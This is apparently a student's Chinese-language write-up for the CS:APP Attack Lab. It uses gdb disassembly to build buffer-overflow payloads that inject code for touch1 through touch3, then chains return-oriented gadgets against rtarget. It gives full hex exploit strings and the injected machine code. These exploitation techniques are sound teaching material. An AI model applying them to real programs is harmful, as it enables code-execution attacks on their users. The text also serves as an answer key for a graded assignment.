1. touch1()

ctarget的流程如下：

```c
void test()
{
    int val;
    val = getbuf();
    printf("No exploit. Getbuf returned 0x%x\n", val);
}
```

其中：

```c
unsigned getbuf()
{
    char buf[BUFFER_SIZE];
    Gets(buf);
    return 1;
}
```

需要通过代码注入攻击使得 getbuf() 运行结束后返回到 touch1() 函数：

```C
void touch1() {
    vlevel = 1;
    printf("Touch!: You called touch1()\n");
    validate(1);
    exit(0);
}
```

利用`gdb` 调试`ctarget`找到我们需要的信息

```
gdb ctarget
```

首先反汇编test():

```
(gdb)  disas test
Dump of assembler code for function test:
   0x0000000000401968 <+0>:		sub    $0x8,%rsp
   0x000000000040196c <+4>:		mov    $0x0,%eax
   0x0000000000401971 <+9>:		callq  0x4017a8 <getbuf>
   0x0000000000401976 <+14>:	mov    %eax,%edx
   0x0000000000401978 <+16>:	mov    $0x403188,%esi
   0x000000000040197d <+21>:	mov    $0x1,%edi
   0x0000000000401982 <+26>:	mov    $0x0,%eax
   0x0000000000401987 <+31>:	callq  0x400df0 <__printf_chk@plt>
   0x000000000040198c <+36>:	add    $0x8,%rsp
   0x0000000000401990 <+40>:	retq  
```

然后反汇编getbuf():

```
(gdb) > disas getbuf
   0x00000000004017a8 <+0>:     sub    $0x28,%rsp
   0x00000000004017ac <+4>:     mov    %rsp,%rdi
   0x00000000004017af <+7>:     callq  0x401a40 <Gets>
   0x00000000004017b4 <+12>:    mov    $0x1,%eax
   0x00000000004017b9 <+17>:    add    $0x28,%rsp
   0x00000000004017bd <+21>:    retq
```

也就是说，当getbuf函数运行到retq这个语句时，应该让它返回至touch1()的地址，首先理解retq这个语句的含义：

![image-20210506213903895](/mnt/projects/CSAPP-Assignments/my-solution/3-Attack-Lab/target1/image-20210506213903895.png)

函数在跳转前会将返回的地址压到栈顶，返回前会先将栈顶保存的地址弹出再跳转。因此，找到getbuf()函数存放返回地址的栈上的那个内存单元改变里面的值即可。



在getbuf的首句打上断点并运行：

```
(gdb) b *0x4017a8
Breakpoint 1 at 0x4017a8: file buf.c, line 12.

(gdb) run -q
Starting program: /mnt/projects/CSAPP-Assignments/my-solution/3-Attack-Lab/target1/ctarget -q
Cookie: 0x59b997fa

Breakpoint 1, getbuf () at buf.c:12
12	buf.c: No such file or directory.
(gdb) disas
Dump of assembler code for function getbuf:
=> 0x00000000004017a8 <+0>:		sub    $0x28,%rsp
   0x00000000004017ac <+4>:		mov    %rsp,%rdi
   0x00000000004017af <+7>:		callq  0x401a40 <Gets>
   0x00000000004017b4 <+12>:	mov    $0x1,%eax
   0x00000000004017b9 <+17>:	add    $0x28,%rsp
   0x00000000004017bd <+21>:	retq   
End of assembler dump.
```

此时执行到 ==> 处， 此时查看rsp指向内存所存储的值：

```
(gdb) print /x *(int*) $rsp
$1 = 0x401976
```

而0x401976是test()函数中执行完getbuf()下一个语句的地址，因此通过代码注入将这个位置的内容改成touch1()的地址。



从第一行`sub $0x28, %rsp`中显示，在栈上为`buf`提供了0x28也就是40个字节的空间,反汇编`touch1`函数，找到`touch1`函数的起始地址:

```
(gdb)> disas touch1
   0x00000000004017c0 <+0>:     sub    $0x8,%rsp
   0x00000000004017c4 <+4>:     movl   $0x1,0x202d0e(%rip)
   0x00000000004017ce <+14>:    mov    $0x4030c5,%edi
   0x00000000004017d3 <+19>:    callq  0x400cc0 <puts@plt>
   0x00000000004017d8 <+24>:    mov    $0x1,%edi
   0x00000000004017dd <+29>:    callq  0x401c8d <validate>
   0x00000000004017e2 <+34>:    mov    $0x0,%edi
   0x00000000004017e7 <+39>:    callq  0x400e40 <exit@plt>
```

从第一行中看出，`touch1`的返回地址是`0x00000000004017c0`

输入字符，首先填充栈，可以使用任意字符，这里我使用的是16进制的0x00填充，然后填充`touch1`地址，最后得到是如下结果：

```
00 00 00 00 00 00 00 00 
00 00 00 00 00 00 00 00 
00 00 00 00 00 00 00 00 
00 00 00 00 00 00 00 00 
00 00 00 00 00 00 00 00
c0 17 40 00 00 00 00 00
```

大部分电脑应该都是`little-endian`字节序，即低位在低地址，高位在高地址。

![image-20210507101128729](/mnt/projects/CSAPP-Assignments/my-solution/3-Attack-Lab/target1/image-20210507101128729.png)

```
> ./hex2raw -i solutions/level1.txt | ./ctarget -q
```

![image-20210506212326205](/mnt/projects/CSAPP-Assignments/my-solution/3-Attack-Lab/target1/image-20210506212326205.png)



2. touch2()

touch2()地址：0x00000000004017ec

```
(gdb) disas touch2
Dump of assembler code for function touch2:
   0x00000000004017ec <+0>:		sub    $0x8,%rsp
   0x00000000004017f0 <+4>:		mov    %edi,%edx
   0x00000000004017f2 <+6>:		movl   $0x2,0x202ce0(%rip)        # 0x6044dc <vlevel>
   0x00000000004017fc <+16>:	cmp    0x202ce2(%rip),%edi        # 0x6044e4 <cookie>
   0x0000000000401802 <+22>:	jne    0x401824 <touch2+56>
   0x0000000000401804 <+24>:	mov    $0x4030e8,%esi
   0x0000000000401809 <+29>:	mov    $0x1,%edi
   0x000000000040180e <+34>:	mov    $0x0,%eax
   0x0000000000401813 <+39>:	callq  0x400df0 <__printf_chk@plt>
   0x0000000000401818 <+44>:	mov    $0x2,%edi
   0x000000000040181d <+49>:	callq  0x401c8d <validate>
   0x0000000000401822 <+54>:	jmp    0x401842 <touch2+86>
   0x0000000000401824 <+56>:	mov    $0x403110,%esi
   0x0000000000401829 <+61>:	mov    $0x1,%edi
   0x000000000040182e <+66>:	mov    $0x0,%eax
   0x0000000000401833 <+71>:	callq  0x400df0 <__printf_chk@plt>
   0x0000000000401838 <+76>:	mov    $0x2,%edi
   0x000000000040183d <+81>:	callq  0x401d4f <fail>
   0x0000000000401842 <+86>:	mov    $0x0,%edi
   0x0000000000401847 <+91>:	callq  0x400e40 <exit@plt>
End of assembler dump.
```

为了完成让getbuf()执行结束后跳转至touch2()，并且传递相应参数。那么在ret跳转至touch2()之前，需要将参数寄存器%rdi中存储的内容改成cookie字符串，而这需要若干汇编指令来实现，也就是说，我们需要让getbuf()的retq跳到自己写的代码指令中去，再让自己的代码跳回touch2()里：

首先确定自己需要注入的代码， vim task2code.s：

```
pushq $0x59b997fa   
pop %rdi
push $0x4017ec
retq
```

其中，0x59b997fa是实验的cookie，压入栈上后pop至%rdi寄存器，0x4017ec是touch2()函数的地址，压入栈顶，retq会先将栈顶元素弹出至%rip寄存器后然后执行。

对这一段代码汇编后objdump查看机器指令：

```
➜  vim task2code.s
➜  gcc -c task2code.s 
➜  objdump -d task2code.o > task2code.d
➜  cat task2code.d

task2code.o:     file format elf64-x86-64


Disassembly of section .text:

0000000000000000 <.text>:
   0:	68 fa 97 b9 59       	pushq  $0x59b997fa
   5:	5f                   	pop    %rdi
   6:	68 ec 17 40 00       	pushq  $0x4017ec
   b:	c3                   	retq 
```

可以得到这一段汇编代码对应的机器指令序列为：

```
68 fa 97 b9 59 5f 68 ec 17 40 00 c3
```

那么接下来就只需要思考将这段代码放在哪里：

在getbuf中运行期间，栈结构如下图所示：

![image-20210507114020706](/mnt/projects/CSAPP-Assignments/my-solution/3-Attack-Lab/target1/image-20210507114020706.png)

上图中，我们把自己注入的代码放到0x5561dc78中，那么在0x5561dca0处所存储的指就是0x5561dc78，这样getbuf()中retq语句执行后，我们自己的代码指令会被加载进%rip中开始执行，因此输入的字符串：

```
68 fa 97 b9 59 5f 68 ec
17 40 00 c3 00 00 00 00 
00 00 00 00 00 00 00 00 
00 00 00 00 00 00 00 00 
00 00 00 00 00 00 00 00
78 dc 61 55 00 00 00 00
```

或者（将自己的机器指令放到0x5561dca0的更高位地址也可）：

```
00 00 00 00 00 00 00 00 
00 00 00 00 00 00 00 00 
00 00 00 00 00 00 00 00 
00 00 00 00 00 00 00 00 
00 00 00 00 00 00 00 00
a8 dc 61 55 00 00 00 00
68 fa 97 b9 59 5f 68 ec
17 40 00 c3 00 00 00 00
```

3. touch3()

0x59b997fa是实验的cookie，其字符串（末尾有'\n'）表示为:

```
35 39 62 39 39 37 66 61 00
```

相比于touch2，这会传递的参数不再是直接cookie本身，而是需要先将cookie字符串放到一个合适的位置，然后再传递这个位置的地址作为参数，同时要考虑在hexmatch和strncmp函数被调用时栈上数据会被更改的可能性。为了防止在调用 hexmatch和strncmp函数时可能对栈结构造成的破坏，我们把cookie存到地址的较高位置，即比getbuf的ret地址处的更高位置，getbuf的ret地址是0x5561dca0,那么将字符串就存到比他高的地方：

因此可以先确定注入代码：

```
pushq $0x5561dca8  
pop %rdi
push $0x4018fa
retq
```

获得对应的机器代码指令序列：

```
➜  target1 git:(master) ✗ vim task3code.s
➜  target1 git:(master) ✗ gcc -c task3code.s
➜  target1 git:(master) ✗ objdump -d task3code.o > task3code.d
➜  target1 git:(master) ✗ cat task3code.d

task3code.o:     file format elf64-x86-64


Disassembly of section .text:

0000000000000000 <.text>:
   0:	68 a8 dc 61 55       	pushq  $0x5561dca8
   5:	5f                   	pop    %rdi
   6:	68 fa 18 40 00       	pushq  $0x4018fa
   b:	c3                   	retq  
```

因此注入代码机器指令序列：

```
68 a8 dc 61 55 5f 68 fa 18 40 00 c3
```

然后可得输入字符串内容：

![image-20210507162732674](/mnt/projects/CSAPP-Assignments/my-solution/3-Attack-Lab/target1/image-20210507162732674.png)

输入文本：

```
68 a8 dc 61 55 5f 68 fa
18 40 00 c3 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
78 dc 61 55 00 00 00 00 
35 39 62 39 39 37 66 61
00 00 00 00 00 00 00 00
```



4. return 1

来分析一下这个问题，由于rtarget中加入了栈地址随机化和栈内存不可执行的干扰，无法再像task2那样明文把栈地址作为字符串内容输入进去；并且，为了实现攻击，代码的逻辑上必然是两个过程，第一，%rdi寄存器中的值变成cookie，然后跳转到touch2()的地址；由于只能使用已有的机器指令序列，不可能刚好凑巧有一个popq %rdi 和 ret 挨到一起（这样的话直接在%rsp+48处放上cookie，在%rsp+40处放上那个凑巧代码指令的起始地址即可），因此需要周转一下，我们可以先把cookie的值pop到一个通用寄存器中，再将这个寄存器的值mov到 %rdi中，然后再ret到touch2()的地址里，基于这个思路，最终应该使得栈结构如下图所示：

![image-20210508201346508](/mnt/projects/CSAPP-Assignments/my-solution/3-Attack-Lab/target1/image-20210508201346508.png)

当getbuf函数执行到ret（ret1）语句时，此时时刻为t1，此刻栈顶是rsp+40，在这个内存单元放上一个指令的起始地址，那么当retq语句生效后，此时栈顶变成rsp+48,也就是t2时刻，让接下来这段代码的语义为将栈顶元素pop至一个寄存器之中然后ret（ret2），暂时就定为%rax，那么当语句执行到ret(ret2)时，此时的栈顶又变成了%rsp+56,也就是t3时刻，此时执行ret(ret2)语句实际上就会跳转到%rsp+56中存储的指令地址上，也就是code address 2，我们让这一段指令的语义为%rax中的内容mov到%rdi中，那么当ret(ret2)生效之后此时栈顶会变成%rsp+64这个位置，让这个位置存储touch2()地址，直接ret(ret3)即可。

综上所述，code 1 的逻辑应该是 pop %rax + ret， code2的逻辑应该是 mov %rax，%rdi + ret，对应的：

```
code1：  
	popq %rax  		----->  58
	ret        		----->  c3
code2:
	mov %rax, %rdi  ----->  48 89 c7
	ret             ----->  c3
```

接下来就只需要搜索上述的指令组合位置在哪里即可，考虑到0x90代表的是nop操作，在我们想要的组合之间出现90也是可以的，

先把start_farm和end_farm之间的汇编代码找到，然后ctrl+F查找就能找到：

```
0000000000401994 <start_farm>:
  401994:	b8 01 00 00 00       	mov    $0x1,%eax
  401999:	c3                   	retq   

000000000040199a <getval_142>:
  40199a:	b8 fb 78 90 90       	mov    $0x909078fb,%eax
  40199f:	c3                   	retq   

00000000004019a0 <addval_273>:
  4019a0:	8d 87 48 89 c7 c3    	lea    -0x3c3876b8(%rdi),%eax
  4019a6:	c3                   	retq   

00000000004019a7 <addval_219>:
  4019a7:	8d 87 51 73 58 90    	lea    -0x6fa78caf(%rdi),%eax    //  <---------- here for code1
  4019ad:	c3                   	retq   

00000000004019ae <setval_237>:
  4019ae:	c7 07 48 89 c7 c7    	movl   $0xc7c78948,(%rdi)
  4019b4:	c3                   	retq   

00000000004019b5 <setval_424>:
  4019b5:	c7 07 54 c2 58 92    	movl   $0x9258c254,(%rdi)
  4019bb:	c3                   	retq   

00000000004019bc <setval_470>:
  4019bc:	c7 07 63 48 8d c7    	movl   $0xc78d4863,(%rdi)
  4019c2:	c3                   	retq   

00000000004019c3 <setval_426>:
  4019c3:	c7 07 48 89 c7 90    	movl   $0x90c78948,(%rdi)         //  <---------- here for code2
  4019c9:	c3                   	retq   

00000000004019ca <getval_280>:
  4019ca:	b8 29 58 90 c3       	mov    $0xc3905829,%eax
  4019cf:	c3                   	retq   

00000000004019d0 <mid_farm>:
  4019d0:	b8 01 00 00 00       	mov    $0x1,%eax
  4019d5:	c3                   	retq   

00000000004019d6 <add_xy>:
  4019d6:	48 8d 04 37          	lea    (%rdi,%rsi,1),%rax
  4019da:	c3                   	retq   

00000000004019db <getval_481>:
  4019db:	b8 5c 89 c2 90       	mov    $0x90c2895c,%eax
  4019e0:	c3                   	retq   

00000000004019e1 <setval_296>:
  4019e1:	c7 07 99 d1 90 90    	movl   $0x9090d199,(%rdi)
  4019e7:	c3                   	retq   

00000000004019e8 <addval_113>:
  4019e8:	8d 87 89 ce 78 c9    	lea    -0x36873177(%rdi),%eax
  4019ee:	c3                   	retq   

00000000004019ef <addval_490>:
  4019ef:	8d 87 8d d1 20 db    	lea    -0x24df2e73(%rdi),%eax
  4019f5:	c3                   	retq   

00000000004019f6 <getval_226>:
  4019f6:	b8 89 d1 48 c0       	mov    $0xc048d189,%eax
  4019fb:	c3                   	retq   

00000000004019fc <setval_384>:
  4019fc:	c7 07 81 d1 84 c0    	movl   $0xc084d181,(%rdi)
  401a02:	c3                   	retq   

0000000000401a03 <addval_190>:
  401a03:	8d 87 41 48 89 e0    	lea    -0x1f76b7bf(%rdi),%eax
  401a09:	c3                   	retq   

0000000000401a0a <setval_276>:
  401a0a:	c7 07 88 c2 08 c9    	movl   $0xc908c288,(%rdi)
  401a10:	c3                   	retq   

0000000000401a11 <addval_436>:
  401a11:	8d 87 89 ce 90 90    	lea    -0x6f6f3177(%rdi),%eax
  401a17:	c3                   	retq   

0000000000401a18 <getval_345>:
  401a18:	b8 48 89 e0 c1       	mov    $0xc1e08948,%eax
  401a1d:	c3                   	retq   

0000000000401a1e <addval_479>:
  401a1e:	8d 87 89 c2 00 c9    	lea    -0x36ff3d77(%rdi),%eax
  401a24:	c3                   	retq   

0000000000401a25 <addval_187>:
  401a25:	8d 87 89 ce 38 c0    	lea    -0x3fc73177(%rdi),%eax
  401a2b:	c3                   	retq   

0000000000401a2c <setval_248>:
  401a2c:	c7 07 81 ce 08 db    	movl   $0xdb08ce81,(%rdi)
  401a32:	c3                   	retq   

0000000000401a33 <getval_159>:
  401a33:	b8 89 d1 38 c9       	mov    $0xc938d189,%eax
  401a38:	c3                   	retq   

0000000000401a39 <addval_110>:
  401a39:	8d 87 c8 89 e0 c3    	lea    -0x3c1f7638(%rdi),%eax
  401a3f:	c3                   	retq   

0000000000401a40 <addval_487>:
  401a40:	8d 87 89 c2 84 c0    	lea    -0x3f7b3d77(%rdi),%eax
  401a46:	c3                   	retq   

0000000000401a47 <addval_201>:
  401a47:	8d 87 48 89 e0 c7    	lea    -0x381f76b8(%rdi),%eax
  401a4d:	c3                   	retq   

0000000000401a4e <getval_272>:
  401a4e:	b8 99 d1 08 d2       	mov    $0xd208d199,%eax
  401a53:	c3                   	retq   

0000000000401a54 <getval_155>:
  401a54:	b8 89 c2 c4 c9       	mov    $0xc9c4c289,%eax
  401a59:	c3                   	retq   

0000000000401a5a <setval_299>:
  401a5a:	c7 07 48 89 e0 91    	movl   $0x91e08948,(%rdi)
  401a60:	c3                   	retq   

0000000000401a61 <addval_404>:
  401a61:	8d 87 89 ce 92 c3    	lea    -0x3c6d3177(%rdi),%eax
  401a67:	c3                   	retq   

0000000000401a68 <getval_311>:
  401a68:	b8 89 d1 08 db       	mov    $0xdb08d189,%eax
  401a6d:	c3                   	retq   

0000000000401a6e <setval_167>:
  401a6e:	c7 07 89 d1 91 c3    	movl   $0xc391d189,(%rdi)
  401a74:	c3                   	retq   

0000000000401a75 <setval_328>:
  401a75:	c7 07 81 c2 38 d2    	movl   $0xd238c281,(%rdi)
  401a7b:	c3                   	retq   

0000000000401a7c <setval_450>:
  401a7c:	c7 07 09 ce 08 c9    	movl   $0xc908ce09,(%rdi)
  401a82:	c3                   	retq   

0000000000401a83 <addval_358>:
  401a83:	8d 87 08 89 e0 90    	lea    -0x6f1f76f8(%rdi),%eax
  401a89:	c3                   	retq   

0000000000401a8a <addval_124>:
  401a8a:	8d 87 89 c2 c7 3c    	lea    0x3cc7c289(%rdi),%eax
  401a90:	c3                   	retq   

0000000000401a91 <getval_169>:
  401a91:	b8 88 ce 20 c0       	mov    $0xc020ce88,%eax
  401a96:	c3                   	retq   

0000000000401a97 <setval_181>:
  401a97:	c7 07 48 89 e0 c2    	movl   $0xc2e08948,(%rdi)
  401a9d:	c3                   	retq   

0000000000401a9e <addval_184>:
  401a9e:	8d 87 89 c2 60 d2    	lea    -0x2d9f3d77(%rdi),%eax
  401aa4:	c3                   	retq   

0000000000401aa5 <getval_472>:
  401aa5:	b8 8d ce 20 d2       	mov    $0xd220ce8d,%eax
  401aaa:	c3                   	retq   

0000000000401aab <setval_350>:
  401aab:	c7 07 48 89 e0 90    	movl   $0x90e08948,(%rdi)
  401ab1:	c3                   	retq   

0000000000401ab2 <end_farm>:
  401ab2:	b8 01 00 00 00       	mov    $0x1,%eax
  401ab7:	c3                   	retq   
  401ab8:	90                   	nop
  401ab9:	90                   	nop
  401aba:	90                   	nop
  401abb:	90                   	nop
  401abc:	90                   	nop
  401abd:	90                   	nop
  401abe:	90                   	nop
  401abf:	90                   	nop
```

对应的：

code1起始地址是0x4019ab，code2起始地址是0x4019c5，那么栈上内容应该是：

![image-20210508202910178](/mnt/projects/CSAPP-Assignments/my-solution/3-Attack-Lab/target1/image-20210508202910178.png)

因此输入的内容应该是：

```
00 00 00 00 00 00 00 00 
00 00 00 00 00 00 00 00 
00 00 00 00 00 00 00 00 
00 00 00 00 00 00 00 00 
00 00 00 00 00 00 00 00
ab 19 40 00 00 00 00 00
fa 97 b9 59 00 00 00 00
c5 19 40 00 00 00 00 00
ec 17 40 00 00 00 00 00
```

测试：

![image-20210508203038364](/mnt/projects/CSAPP-Assignments/my-solution/3-Attack-Lab/target1/image-20210508203038364.png)

